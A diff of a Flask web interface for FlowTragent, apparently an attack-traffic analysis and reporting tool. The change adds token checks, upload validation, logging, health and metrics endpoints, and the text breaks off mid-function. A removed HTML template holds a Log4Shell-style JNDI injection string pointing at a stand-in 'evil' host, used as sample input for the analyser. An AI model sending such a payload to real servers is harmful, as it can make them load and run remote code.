@@ -1,457 +1,97 @@
-"""Minimal Flask UI for FlowTragent."""
+"""Flask UI for FlowTragent."""
 
 from __future__ import annotations
 
 import json
+import os
 import shutil
 import subprocess
 import tempfile
 import zipfile
+from hmac import compare_digest
 from pathlib import Path
 
-from flask import Flask, Response, redirect, render_template_string, request, send_file, send_from_directory, url_for
+from flask import Flask, Response, jsonify, redirect, render_template, request, send_file, send_from_directory, url_for
 from werkzeug.utils import secure_filename
 
-from main import run_payload, run_pcap
 from src.core.settings import load_config
+from src.core.structured_logging import log_event
+from src.orchestrator.pipeline import run_payload, run_pcap
 from src.storage.alert_store import AlertStore
 
 
 app = Flask(__name__)
 CONFIG = load_config()
 ALERT_DB = Path(CONFIG.get("live", {}).get("alert_db", "data/live/alerts.db"))
+WEB_CONFIG = CONFIG.get("web", {})
+MAX_UPLOAD_BYTES = int(WEB_CONFIG.get("max_upload_mb", 50)) * 1024 * 1024
+ALLOWED_PCAP_EXTENSIONS = {str(item).lower() for item in WEB_CONFIG.get("allowed_pcap_extensions", [".pcap", ".cap", ".pcapng"])}
+ALLOWED_LOG_EXTENSIONS = {str(item).lower() for item in WEB_CONFIG.get("allowed_log_extensions", [".log", ".txt", ".jsonl", ".csv"])}
+PCAP_MAGIC_PREFIXES = (
+    b"\xd4\xc3\xb2\xa1",
+    b"\xa1\xb2\xc3\xd4",
+    b"\x4d\x3c\xb2\xa1",
+    b"\xa1\xb2\x3c\x4d",
+    b"\x0a\x0d\x0d\x0a",
+)
+app.config["MAX_CONTENT_LENGTH"] = MAX_UPLOAD_BYTES
+
+PROTECTED_ENDPOINTS = {
+    "alerts",
+    "analyze_payload",
+    "analyze_pcap",
+    "download_report",
+    "delete_report",
+    "export_reports_zip",
+    "graph_svg",
+}
 
 
-PAGE = """
-<!doctype html>
-<html lang="zh-CN">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>FlowTragent</title>
-  <style>
-    :root {
-      color-scheme: light;
-      --bg: #f5f6f8;
-      --panel: #ffffff;
-      --line: #d9dde3;
-      --line-soft: #e8ebef;
-      --text: #171a1f;
-      --muted: #69707a;
-      --ink: #2f3338;
-      --accent: #3f4752;
-      --accent-hover: #222831;
-      --danger: #9f2a2a;
-    }
-    * { box-sizing: border-box; }
-    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: var(--text); background: var(--bg); }
-    main { max-width: 1180px; margin: 0 auto; padding: 24px; }
-    header { display: flex; align-items: flex-end; justify-content: space-between; gap: 18px; padding: 18px 0 20px; border-bottom: 1px solid var(--line); }
-    h1 { margin: 0; font-size: 24px; letter-spacing: 0; }
-    h2 { margin: 0 0 14px; font-size: 16px; }
-    p { margin: 0; }
-    section { margin: 16px 0; padding: 18px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); }
-    textarea { width: 100%; min-height: 136px; resize: vertical; border: 1px solid var(--line); border-radius: 6px; padding: 10px; font-family: Consolas, monospace; font-size: 13px; background: #fbfbfc; color: var(--ink); }
-    input[type="text"], input[name="q"] { border: 1px solid var(--line); border-radius: 6px; padding: 8px 10px; min-width: 240px; background: #fff; }
-    input[type="file"] { width: 100%; font-size: 13px; color: var(--muted); }
-    button, .button { display: inline-flex; align-items: center; justify-content: center; gap: 6px; min-height: 34px; padding: 7px 12px; border: 1px solid var(--accent); background: var(--accent); color: #fff; border-radius: 6px; font-size: 14px; text-decoration: none; cursor: pointer; }
-    button:hover, .button:hover { background: var(--accent-hover); text-decoration: none; }
-    .button.secondary { color: var(--ink); background: #fff; border-color: var(--line); }
-    .button.secondary:hover { background: #f0f2f4; }
-    .button.danger, button.danger { background: #fff; color: var(--danger); border-color: #d8b8b8; }
-    .button.danger:hover, button.danger:hover { background: #fff5f5; }
-    a { color: #30363d; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-    .subtle { color: var(--muted); font-size: 13px; margin-top: 6px; }
-    .grid { display: grid; grid-template-columns: minmax(0, 1fr) minmax(0, 1fr); gap: 16px; }
-    .checks { display: flex; gap: 14px; flex-wrap: wrap; align-items: center; color: var(--muted); font-size: 13px; margin: 12px 0; }
-    .checks input { vertical-align: middle; }
-    .file-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
-    .file-grid label { display: grid; gap: 7px; padding: 10px; border: 1px solid var(--line-soft); border-radius: 6px; color: var(--muted); font-size: 13px; background: #fbfbfc; }
-    .result { background: #f0f2f4; border-color: #cdd2d8; display: flex; justify-content: space-between; gap: 12px; align-items: center; }
-    .toolbar { display: flex; flex-wrap: wrap; gap: 8px; align-items: center; margin-bottom: 12px; }
-    .report-list { display: grid; gap: 8px; padding: 0; list-style: none; }
-    .report-list li { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 12px; align-items: center; padding: 11px 12px; border: 1px solid var(--line-soft); border-radius: 6px; background: #fff; }
-    .report-name { overflow-wrap: anywhere; font-family: Consolas, monospace; font-size: 13px; }
-    .actions { display: flex; gap: 7px; align-items: center; flex-wrap: wrap; justify-content: flex-end; }
-    @media (max-width: 860px) {
-      main { padding: 16px; }
-      header, .grid, .file-grid, .report-list li, .result { display: block; }
-      section { margin: 14px 0; }
-      .file-grid label, .actions { margin-top: 10px; }
-      input[type="text"], input[name="q"] { width: 100%; min-width: 0; }
-    }
-  </style>
-</head>
-<body>
-<main>
-  <header>
-    <div>
-      <h1>FlowTragent</h1>
-      <p class="subtle">攻击流量输入 -> 多源证据融合 -> 中英文溯源报告</p>
-    </div>
-    <div class="actions">
-      <a class="button secondary" href="{{ url_for('alerts') }}">实时告警</a>
-      <a class="button secondary" href="{{ url_for('index') }}">刷新</a>
-    </div>
-  </header>
-
-  <div class="grid">
-    <section>
-      <h2>Payload 分析</h2>
-      <form method="post" action="/analyze-payload">
-        <textarea name="payload" placeholder="GET /?x=${jndi:ldap://evil/a} HTTP/1.1 Host: victim"></textarea>
-        <p class="checks">
-          <label><input type="checkbox" name="demo_index" checked> demo index</label>
-          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
-          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
-        </p>
-        <button type="submit">生成报告</button>
-      </form>
-    </section>
-
-    <section>
-      <h2>PCAP + 日志分析</h2>
-      <form method="post" action="/analyze-pcap" enctype="multipart/form-data">
-        <div class="file-grid">
-          <label>PCAP <input type="file" name="pcap" accept=".pcap,.cap,.pcapng"></label>
-          <label>Access Log <input type="file" name="access_log" accept=".log,.txt,.jsonl,.csv"></label>
-          <label>DNS Log <input type="file" name="dns_log" accept=".log,.txt,.jsonl,.csv"></label>
-          <label>Endpoint Log <input type="file" name="endpoint_log" accept=".log,.txt,.jsonl,.csv"></label>
-        </div>
-        <p class="checks">
-          <label><input type="checkbox" name="demo_index" checked> demo index</label>
-          <label><input type="checkbox" name="enable_rag" checked> RAG</label>
-          <label><input type="checkbox" name="enable_ollama"> Ollama</label>
-        </p>
-        <button type="submit">上传并分析</button>
-      </form>
-    </section>
-  </div>
-
-  {% if report %}
-  <section class="result">
-    <div>
-      <strong>报告已生成</strong>
-      <p class="subtle">{{ report.name }}</p>
-    </div>
-    <div class="actions">
-      <a class="button" href="{{ url_for('view_report', filename=report.name, lang='zh') }}">中文查看</a>
-      <a class="button secondary" href="{{ url_for('view_report', filename=report.name, lang='en') }}">English</a>
-    </div>
-  </section>
-  {% endif %}
-
-  <section>
-    <h2>最近报告</h2>
-    <form class="toolbar" method="get" action="/">
-      <input name="q" value="{{ q or '' }}" placeholder="按文件名搜索报告">
-      <button type="submit">搜索</button>
-      <a class="button secondary" href="{{ url_for('export_reports_zip') }}">导出 ZIP</a>
-    </form>
-    {% if reports %}
-    <ul class="report-list">
-      {% for item in reports %}
-      <li>
-        <span class="report-name">{{ item.name }}</span>
-        <span class="actions">
-          <a class="button" href="{{ url_for('view_report', filename=item.name, lang='zh') }}">中文</a>
-          <a class="button secondary" href="{{ url_for('view_report', filename=item.name, lang='en') }}">English</a>
-          <a class="button secondary" href="{{ url_for('download_report', filename=item.name) }}">MD</a>
-          {% if item.zh_name %}
-          <a class="button secondary" href="{{ url_for('download_report', filename=item.zh_name) }}">中文 MD</a>
-          {% endif %}
-          {% if item.json_name %}
-          <a class="button secondary" href="{{ url_for('download_report', filename=item.json_name) }}">JSON</a>
-          {% endif %}
-          <form method="post" action="{{ url_for('delete_report', filename=item.name) }}" style="display:inline;" onsubmit="return confirm('确认删除该报告的 Markdown/JSON/DOT/PNG/SVG 文件？');">
-            <button class="danger" type="submit">删除</button>
-          </form>
-        </span>
-      </li>
-      {% endfor %}
-    </ul>
-    {% else %}
-    <p class="subtle">暂无报告。</p>
-    {% endif %}
-  </section>
-</main>
-</body>
-</html>
-"""
-
-
-ALERTS_PAGE = """
-<!doctype html>
-<html lang="zh-CN">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>实时告警 - FlowTragent</title>
-  <style>
-    :root { color-scheme: light; --bg:#f5f6f8; --panel:#fff; --line:#d9dde3; --soft:#e8ebef; --text:#171a1f; --muted:#69707a; --accent:#3f4752; }
-    * { box-sizing: border-box; }
-    body { margin:0; font-family: Arial, "Microsoft YaHei", sans-serif; color:var(--text); background:var(--bg); }
-    main { max-width:1220px; margin:0 auto; padding:24px; }
-    header { display:flex; justify-content:space-between; gap:16px; align-items:center; padding:16px 0 18px; border-bottom:1px solid var(--line); }
-    h1 { margin:0; font-size:22px; }
-    section { margin:16px 0; padding:18px; border:1px solid var(--line); border-radius:8px; background:var(--panel); }
-    table { width:100%; border-collapse:collapse; font-size:13px; }
-    th, td { border-bottom:1px solid var(--soft); padding:8px; text-align:left; vertical-align:top; }
-    code { font-family:Consolas, monospace; overflow-wrap:anywhere; }
-    a { color:#30363d; text-decoration:none; }
-    a:hover { text-decoration:underline; }
-    .button { display:inline-flex; align-items:center; min-height:34px; padding:7px 12px; border:1px solid var(--line); border-radius:6px; color:#222; background:#fff; text-decoration:none; }
-    .toolbar { display:flex; gap:8px; flex-wrap:wrap; align-items:center; }
-    .muted { color:var(--muted); }
-    .pill { display:inline-flex; padding:3px 8px; border-radius:999px; border:1px solid var(--line); background:#f7f8fa; }
-    .critical { border-color:#b42318; color:#b42318; background:#fff5f5; }
-    .high { border-color:#b54708; color:#b54708; background:#fff7ed; }
-    .medium { border-color:#a16207; color:#a16207; background:#fefce8; }
-    .low { border-color:#64748b; color:#475569; background:#f8fafc; }
-    @media (max-width:860px) { main { padding:16px; } header { display:block; } table { display:block; overflow:auto; } .toolbar { margin-top:10px; } }
-  </style>
-</head>
-<body>
-<main>
-  <header>
-    <div>
-      <h1>实时告警</h1>
-      <p class="muted">准实时预筛结果与深度溯源报告</p>
-    </div>
-    <nav class="toolbar">
-      <a class="button" href="{{ url_for('index') }}">返回首页</a>
-      <a class="button" href="{{ url_for('alerts') }}">刷新</a>
-    </nav>
-  </header>
-  <section>
-    {% if alerts %}
-    <table>
-      <thead>
-        <tr>
-          <th>时间</th>
-          <th>严重度</th>
-          <th>状态</th>
-          <th>分数</th>
-          <th>PCAP</th>
-          <th>原因</th>
-          <th>统计</th>
-          <th>报告</th>
-        </tr>
-      </thead>
-      <tbody>
-      {% for item in alerts %}
-        <tr>
-          <td><code>{{ item.created_at }}</code></td>
-          <td><span class="pill {{ item.severity }}">{{ item.severity }}</span></td>
-          <td>{{ item.status }}</td>
-          <td>{{ item.risk_score }}</td>
-          <td><code>{{ item.segment_path }}</code></td>
-          <td>{{ item.reasons|join(", ") }}</td>
-          <td>
-            events={{ item.stats.get("event_count", 0) }},
-            http={{ item.stats.get("http_event_count", 0) }},
-            dns={{ item.stats.get("dns_event_count", 0) }},
-            tcp={{ item.stats.get("tcp_event_count", 0) }}
-          </td>
-          <td>
-            {% if item.report_path %}
-              {% set report_name = item.report_path.split('/')[-1].split('\\\\')[-1] %}
-              <a href="{{ url_for('view_report', filename=report_name, lang='zh') }}">中文</a>
-              |
-              <a href="{{ url_for('view_report', filename=report_name, lang='en') }}">English</a>
-            {% elif item.error %}
-              <span class="muted">{{ item.error }}</span>
-            {% else %}
-              <span class="muted">{{ item.recommended_action }}</span>
-            {% endif %}
-          </td>
-        </tr>
-      {% endfor %}
-      </tbody>
-    </table>
-    {% else %}
-    <p class="muted">暂无实时告警。启动 `scripts/live_analyzer_worker.py` 后，这里会显示预筛与分析结果。</p>
-    {% endif %}
-  </section>
-</main>
-</body>
-</html>
-"""
-
-
-REPORT_PAGE = """
-<!doctype html>
-<html lang="{{ 'zh-CN' if lang == 'zh' else 'en' }}">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>{{ filename }} - FlowTragent</title>
-  <style>
-    :root {
-      color-scheme: light;
-      --bg: #f5f6f8;
-      --panel: #ffffff;
-      --line: #d9dde3;
-      --line-soft: #e8ebef;
-      --text: #171a1f;
-      --muted: #69707a;
-      --accent: #3f4752;
-    }
-    * { box-sizing: border-box; }
-    body { margin: 0; font-family: Arial, "Microsoft YaHei", sans-serif; color: var(--text); background: var(--bg); }
-    main { max-width: 1220px; margin: 0 auto; padding: 24px; }
-    header { display: flex; justify-content: space-between; gap: 16px; align-items: center; padding: 16px 0 18px; border-bottom: 1px solid var(--line); }
-    h1 { font-size: 20px; margin: 0; overflow-wrap: anywhere; }
-    h2 { margin: 0 0 14px; font-size: 16px; }
-    h3 { margin: 16px 0 8px; font-size: 14px; }
-    section { margin: 16px 0; padding: 18px; border: 1px solid var(--line); border-radius: 8px; background: var(--panel); }
-    a { color: #30363d; text-decoration: none; }
-    a:hover { text-decoration: underline; }
-    .button { display: inline-flex; align-items: center; justify-content: center; min-height: 34px; padding: 7px 12px; border: 1px solid var(--line); border-radius: 6px; color: #222; background: #fff; text-decoration: none; }
-    .button.active { color: #fff; border-color: var(--accent); background: var(--accent); }
-    .tabs { display: flex; gap: 8px; flex-wrap: wrap; }
-    .meta { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; }
-    .meta div { padding: 11px; background: #f7f8fa; border: 1px solid var(--line-soft); border-radius: 6px; }
-    .label { color: var(--muted); font-size: 12px; margin-bottom: 4px; }
-    .graph-svg { width: 100%; min-height: 300px; border: 1px solid var(--line-soft); border-radius: 6px; background: white; }
-    .mermaid-panel { overflow: auto; border: 1px solid var(--line-soft); border-radius: 6px; background: #fff; padding: 14px; }
-    .mermaid { min-width: 520px; }
-    details { margin-top: 12px; }
-    summary { cursor: pointer; color: var(--muted); font-size: 13px; }
-    pre { overflow: auto; background: #f7f8fa; border: 1px solid var(--line-soft); padding: 12px; border-radius: 6px; font-size: 12px; }
-    table { width: 100%; border-collapse: collapse; font-size: 13px; }
-    th, td { border-bottom: 1px solid var(--line-soft); padding: 8px; text-align: left; vertical-align: top; }
-    code { font-family: Consolas, monospace; }
-    .actions { display: flex; gap: 8px; flex-wrap: wrap; }
-    @media (max-width: 860px) { main { padding: 16px; } header, .meta { display: block; } .meta div, .tabs { margin-top: 10px; } }
-  </style>
-</head>
-<body>
-<main>
-  <header>
-    <div>
-      <p><a href="{{ url_for('index') }}">{{ '返回首页' if lang == 'zh' else 'Back to home' }}</a></p>
-      <h1>{{ filename }}</h1>
-    </div>
-    <nav class="tabs">
-      <a class="button {{ 'active' if lang == 'zh' else '' }}" href="{{ url_for('view_report', filename=base_md_name, lang='zh') }}">中文</a>
-      <a class="button {{ 'active' if lang == 'en' else '' }}" href="{{ url_for('view_report', filename=base_md_name, lang='en') }}">English</a>
-    </nav>
-  </header>
-
-  <section class="meta">
-    <div><div class="label">{{ '结论' if lang == 'zh' else 'Verdict' }}</div>{{ verdict }}</div>
-    <div><div class="label">{{ '置信度' if lang == 'zh' else 'Confidence' }}</div>{{ confidence }}</div>
-    <div><div class="label">Payloads</div>{{ analysis.get("payload_count", 0) }}</div>
-    <div><div class="label">{{ '图谱' if lang == 'zh' else 'Graph' }}</div>{{ graph.get("nodes", [])|length }} nodes / {{ graph.get("edges", [])|length }} edges</div>
-  </section>
-
-  {% if graph.get(mermaid_key) %}
-  <section>
-    <h2>{{ '证据图谱' if lang == 'zh' else 'Evidence Graph' }}</h2>
-    <div class="mermaid-panel">
-      <div class="mermaid">
-{{ graph.get(mermaid_key) }}
-      </div>
-    </div>
-    {% if graph.get(dot_key) %}
-    <h3>Graphviz SVG</h3>
-    <object class="graph-svg" data="{{ url_for('graph_svg', filename=json_name, lang=lang) }}" type="image/svg+xml">
-      <pre>{{ graph.get(dot_key) }}</pre>
-    </object>
-    {% endif %}
-    <details>
-      <summary>{{ '查看 Mermaid / DOT 源码' if lang == 'zh' else 'Show Mermaid / DOT source' }}</summary>
-      <h3>Mermaid</h3>
-      <pre>{{ graph.get(mermaid_key) }}</pre>
-      <h3>Graphviz DOT</h3>
-      <pre>{{ graph.get(dot_key, "") }}</pre>
-    </details>
-  </section>
-  {% endif %}
-
-  {% if analysis.get("attack_chain") %}
-  <section>
-    <h2>{{ '攻击链' if lang == 'zh' else 'Attack Chain' }}</h2>
-    <table>
-      <thead><tr><th>{{ '阶段' if lang == 'zh' else 'Stage' }}</th><th>{{ '技术' if lang == 'zh' else 'Technique' }}</th><th>{{ '置信度' if lang == 'zh' else 'Confidence' }}</th><th>{{ '证据' if lang == 'zh' else 'Evidence' }}</th></tr></thead>
-      <tbody>
-      {% for item in analysis.get("attack_chain", []) %}
-      <tr>
-        <td>{{ translate_stage(item.get("stage")) if lang == 'zh' else item.get("stage") }}</td>
-        <td>{{ item.get("technique") }}</td>
-        <td>{{ translate_confidence(item.get("confidence")) if lang == 'zh' else item.get("confidence") }}</td>
-        <td><code>{{ item.get("evidence_ids", [])|join(", ") }}</code></td>
-      </tr>
-      {% endfor %}
-      </tbody>
-    </table>
-  </section>
-  {% endif %}
-
-  {% if graph.get("edges") %}
-  <section>
-    <h2>{{ '图谱边' if lang == 'zh' else 'Graph Edges' }}</h2>
-    <table>
-      <thead><tr><th>{{ '来源' if lang == 'zh' else 'Source' }}</th><th>{{ '关系' if lang == 'zh' else 'Relation' }}</th><th>{{ '目标' if lang == 'zh' else 'Target' }}</th><th>{{ '置信度' if lang == 'zh' else 'Confidence' }}</th><th>{{ '原因' if lang == 'zh' else 'Reason' }}</th></tr></thead>
-      <tbody>
-      {% for item in graph.get("edges", [])[:40] %}
-      <tr>
-        <td><code>{{ item.get("source_id") }}</code></td>
-        <td>{{ translate_relation(item.get("relation")) if lang == 'zh' else item.get("relation") }}</td>
-        <td><code>{{ item.get("target_id") }}</code></td>
-        <td>{{ translate_confidence(item.get("confidence")) if lang == 'zh' else item.get("confidence") }}</td>
-        <td>{{ item.get("reason") }}</td>
-      </tr>
-      {% endfor %}
-      </tbody>
-    </table>
-  </section>
-  {% endif %}
-
-  <section class="actions">
-    <a class="button active" href="{{ url_for('download_report', filename=display_md_name) }}">{{ '下载当前 Markdown' if lang == 'zh' else 'Download current Markdown' }}</a>
-    <a class="button" href="{{ url_for('download_report', filename=json_name) }}">JSON</a>
-  </section>
-</main>
-<script type="module">
-  import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";
-  mermaid.initialize({
-    startOnLoad: true,
-    securityLevel: "loose",
-    theme: "base",
-    themeVariables: {
-      primaryColor: "#f7f8fa",
-      primaryTextColor: "#171a1f",
-      primaryBorderColor: "#cfd4da",
-      lineColor: "#69707a",
-      secondaryColor: "#ffffff",
-      tertiaryColor: "#eef0f3",
-      fontFamily: "Arial, Microsoft YaHei, sans-serif"
-    },
-    flowchart: {
-      htmlLabels: true,
-      curve: "basis"
-    }
-  });
-</script>
-</body>
-</html>
-"""
+@app.before_request
+def require_token_for_sensitive_routes():
+    if request.endpoint in PROTECTED_ENDPOINTS and not _token_is_valid():
+        return Response("FLOWTRAGENT_TOKEN is required for this operation.", status=401, mimetype="text/plain")
 
 
 @app.get("/")
 def index():
     q = request.args.get("q", "").strip()
-    return render_template_string(PAGE, report=None, reports=_recent_reports(query=q), q=q)
+    return render_template("index.html", report=None, reports=_recent_reports(query=q), q=q, summary=_ui_summary())
 
 
 @app.get("/alerts")
 def alerts():
     limit = int(request.args.get("limit", "100"))
     store = AlertStore(ALERT_DB)
-    return render_template_string(ALERTS_PAGE, alerts=store.list_alerts(limit=limit))
+    return render_template("alerts.html", alerts=store.list_alerts(limit=limit), activities=store.list_activities(limit=limit))
+
+
+@app.get("/health")
+def health():
+    components = {
+        "capture_worker": _process_health("scripts/live_capture_worker.py"),
+        "analyzer_worker": _process_health("scripts/live_analyzer_worker.py"),
+        "nova_index": _nova_index_health(),
+    }
+    status = "ok" if components["nova_index"]["status"] == "ready" else "degraded"
+    return jsonify(
+        {
+            "status": status,
+            "components": components,
+            "paths": {
+                "report_dir": _path_health(CONFIG["paths"]["report_dir"]),
+                "pcap_dir": _path_health(CONFIG["paths"]["pcap_dir"]),
+                "live_incoming_dir": _path_health(CONFIG.get("live", {}).get("incoming_dir", "data/live/incoming")),
+                "alert_db": _path_health(ALERT_DB, expect_file=True),
+            },
+        }
+    )
+
+
+@app.get("/metrics")
+def metrics():
+    store = AlertStore(ALERT_DB)
+    return Response(_render_prometheus_metrics(store), mimetype="text/plain; version=0.0.4; charset=utf-8")
 
 
 @app.post("/analyze-payload")
@@ -459,6 +99,7 @@ def analyze_payload():
     payload = request.form.get("payload", "").strip()
     if not payload:
         return redirect(url_for("index"))
+    log_event(CONFIG, "web_app", "payload_analysis_requested", "Payload analysis requested.", payload_size=len(payload))
     report = run_payload(
         payload,
         CONFIG,
@@ -468,7 +109,8 @@ def analyze_payload():
         _checked("enable_rag"),
         _checked("enable_ollama"),
     )
-    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")
+    log_event(CONFIG, "web_app", "report_generated", "Payload report generated.", report_path=str(report), input_type="payload")
+    return render_template("index.html", report=report, reports=_recent_reports(), q="", summary=_ui_summary())
 
 
 @app.post("/analyze-pcap")
@@ -476,12 +118,29 @@ def analyze_pcap():
     upload = request.files.get("pcap")
     if upload is None or not upload.filename:
         return redirect(url_for("index"))
+    error = _validate_upload(upload, ALLOWED_PCAP_EXTENSIONS, require_pcap_magic=True)
+    if error:
+        log_event(CONFIG, "web_app", "upload_rejected", "PCAP upload rejected.", level="WARNING", filename=upload.filename, reason=error)
+        return Response(error, status=400, mimetype="text/plain")
     filename = secure_filename(upload.filename)
     pcap_path = Path(CONFIG["paths"]["pcap_dir"]) / filename
     pcap_path.parent.mkdir(parents=True, exist_ok=True)
+    _rewind_upload(upload)
     upload.save(pcap_path)
 
-    uploaded_logs = _save_optional_logs()
+    uploaded_logs, log_error = _save_optional_logs()
+    if log_error:
+        pcap_path.unlink(missing_ok=True)
+        log_event(CONFIG, "web_app", "upload_rejected", "Supplementary log upload rejected.", level="WARNING", filename=upload.filename, reason=log_error)
+        return Response(log_error, status=400, mimetype="text/plain")
+    log_event(
+        CONFIG,
+        "web_app",
+        "pcap_analysis_requested",
+        "PCAP analysis requested.",
+        pcap_path=str(pcap_path),
+        supplementary_log_count=sum(len(items) for items in uploaded_logs.values()),
+    )
     report = run_pcap(
         pcap_path,
         CONFIG,
@@ -493,8 +152,10 @@ def analyze_pcap():
         access_logs=uploaded_logs["access_log"],
         dns_logs=uploaded_logs["dns_log"],
         endpoint_logs=uploaded_logs["endpoint_log"],
+        application_logs=uploaded_logs["app_log"],
     )
-    return render_template_string(PAGE, report=report, reports=_recent_reports(), q="")
+    log_event(CONFIG, "web_app", "report_generated", "PCAP report generated.", report_path=str(report), input_type="pcap", pcap_path=str(pcap_path))
+    return render_template("index.html", report=report, reports=_recent_reports(), q="", summary=_ui_summary())
 
 
 @app.get("/view-report/<path:filename>")
@@ -511,8 +172,8 @@ def view_report(filename: str):
     analysis = json.loads(json_path.read_text(encoding="utf-8"))
     impact = analysis.get("impact_assessment") or {}
     display_md_name = _localized_md_name(base_md_name, lang)
-    return render_template_string(
-        REPORT_PAGE,
+    return render_template(
+        "report_detail.html",
         filename=display_md_name,
         display_md_name=display_md_name,
         base_md_name=base_md_name,
@@ -533,7 +194,9 @@ def view_report(filename: str):
 
 @app.get("/reports/<path:filename>")
 def download_report(filename: str):
-    return send_from_directory(CONFIG["paths"]["report_dir"], secure_filename(filename), as_attachment=False)
+    safe_name = secure_filename(filename)
+    log_event(CONFIG, "web_app", "report_downloaded", "Report downloaded.", filename=safe_name)
+    return send_from_directory(CONFIG["paths"]["report_dir"], safe_name, as_attachment=False)
 
 
 @app.post("/delete-report/<path:filename>")
@@ -541,10 +204,13 @@ def delete_report(filename: str):
     safe_name = secure_filename(filename)
     report_dir = Path(CONFIG["paths"]["report_dir"])
     base = Path(_base_md_name(safe_name)).stem
+    deleted = []
     for suffix in (".md", "_zh.md", ".json", ".dot", "_zh.dot", ".png", ".svg"):
         target = report_dir / f"{base}{suffix}"
         if target.exists() and target.resolve().parent == report_dir.resolve():
             target.unlink()
+            deleted.append(target.name)
+    log_event(CONFIG, "web_app", "report_deleted", "Report artifacts deleted.", filename=safe_name, deleted_files=deleted)
     return redirect(url_for("index"))
 
 
@@ -557,6 +223,7 @@ def export_reports_zip():
         for path in sorted(report_dir.glob("flowtragent_report_*.*")):
             if path.suffix.lower() in {".md", ".json", ".dot", ".png", ".svg"}:
                 archive.write(path, arcname=path.name)
+    log_event(CONFIG, "web_app", "reports_exported", "Reports ZIP exported.", archive_path=tmp.name)
     return send_file(tmp.name, mimetype="application/zip", as_attachment=True, download_name="flowtragent_reports.zip")
 
 
@@ -587,6 +254,168 @@ def _checked(name: str) -> bool:
     return request.form.get(name) == "on"
 
 
+def _token_is_valid() -> bool:
+    expected = os.getenv("FLOWTRAGENT_TOKEN", "")
+    if not expected:
+        return True
+    supplied = _request_token()
+    return bool(supplied) and compare_digest(supplied, expected)
+
+
+def _request_token() -> str:
+    auth = request.headers.get("Authorization", "")
+    if auth.lower().startswith("bearer "):
+        return auth[7:].strip()
+    return (
+        request.headers.get("X-FlowTragent-Token", "")
+        or request.form.get("flowtragent_token", "")
+        or request.args.get("token", "")
+    ).strip()
+
+
+def _process_health(process_marker: str) -> dict[str, object]:
+    if os.name == "nt":
+        return {"status": "unknown", "running": None, "reason": "process check is only available on Linux"}
+    try:
+        result = subprocess.run(["pgrep", "-f", process_marker], check=False, capture_output=True, text=True, timeout=2)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return {"status": "unknown", "running": None, "reason": str(exc)}
+    pids = [line.strip() for line in result.stdout.splitlines() if line.strip()]
+    return {"status": "running" if pids else "stopped", "running": bool(pids), "pids": pids}
+
+
+def _nova_index_health() -> dict[str, object]:
+    index_dir = Path(CONFIG["paths"].get("index_dir", "data/index"))
+    nova_f = Path(CONFIG["paths"].get("nova_f", "libs/nova-f"))
+    model = Path(CONFIG["retrieval"].get("model_name", ""))
+    index_files = sorted(path.name for path in index_dir.glob("*") if path.is_file()) if index_dir.exists() else []
+    ready = index_dir.exists() and bool(index_files)
+    return {
+        "status": "ready" if ready else "missing",
+        "index_dir": str(index_dir),
+        "index_files": index_files[:20],
+        "nova_f_exists": nova_f.exists(),
+        "model_exists": model.exists(),
+    }
+
+
+def _render_prometheus_metrics(store: AlertStore) -> str:
+    summary = store.metrics_summary()
+    index_health = _nova_index_health()
+    report_dir = Path(CONFIG["paths"]["report_dir"])
+    pcap_dir = Path(CONFIG["paths"]["pcap_dir"])
+    incoming_dir = Path(CONFIG.get("live", {}).get("incoming_dir", "data/live/incoming"))
+    metrics: list[tuple[str, str, float, dict[str, str] | None]] = [
+        ("flowtragent_pcaps_processed_total", "Total live PCAP segments observed by the alert store.", float(summary["alerts_total"]), None),
+        ("flowtragent_alert_occurrences_total", "Total alert occurrences including merged duplicate windows.", float(summary["occurrences_total"]), None),
+        ("flowtragent_deep_analyses_total", "Total deep analyses started, reported, or errored.", float(summary["deep_analyses_total"]), None),
+        ("flowtragent_rate_limited_total", "Total live segments skipped by deep-analysis rate limiting.", float(summary["rate_limited_total"]), None),
+        ("flowtragent_notifications_suppressed_total", "Total notifications suppressed by fingerprint windows.", float(summary["notifications_suppressed_total"]), None),
+        ("flowtragent_live_segment_queue_size", "Current PCAP files waiting in the live incoming directory.", float(_count_matching_files(incoming_dir, {".pcap", ".pcapng"})), None),
+        ("flowtragent_report_files_total", "Current generated report markdown files.", float(_count_matching_files(report_dir, {".md"})), None),
+        ("flowtragent_alert_db_size_bytes", "SQLite alert database size in bytes.", float(ALERT_DB.stat().st_size if ALERT_DB.exists() else 0), None),
+        ("flowtragent_nova_index_ready", "Whether the configured NOVA index directory contains index files.", 1.0 if index_health["status"] == "ready" else 0.0, None),
+        ("flowtragent_pcap_storage_files", "Current PCAP files in the configured PCAP directory.", float(_count_matching_files(pcap_dir, {".pcap", ".pcapng", ".cap"})), None),
+    ]
+    for severity, count in sorted(summary["alerts_by_severity"].items()):
+        metrics.append(("flowtragent_alerts_by_severity", "Current alerts grouped by severity.", float(count), {"severity": severity}))
+    for status, count in sorted(summary["alerts_by_status"].items()):
+        metrics.append(("flowtragent_alerts_by_status", "Current alerts grouped by status.", float(count), {"status": status}))
+    return _prometheus_text(metrics)
+
+
+def _prometheus_text(metrics: list[tuple[str, str, float, dict[str, str] | None]]) -> str:
+    lines = []
+    emitted_help = set()
+    for name, help_text, value, labels in metrics:
+        if name not in emitted_help:
+            lines.append(f"# HELP {name} {help_text}")
+            lines.append(f"# TYPE {name} gauge")
+            emitted_help.add(name)
+        label_text = _prometheus_labels(labels or {})
+        lines.append(f"{name}{label_text} {_format_metric_value(value)}")
+    return "\n".join(lines) + "\n"
+
+
+def _prometheus_labels(labels: dict[str, str]) -> str:
+    if not labels:
+        return ""
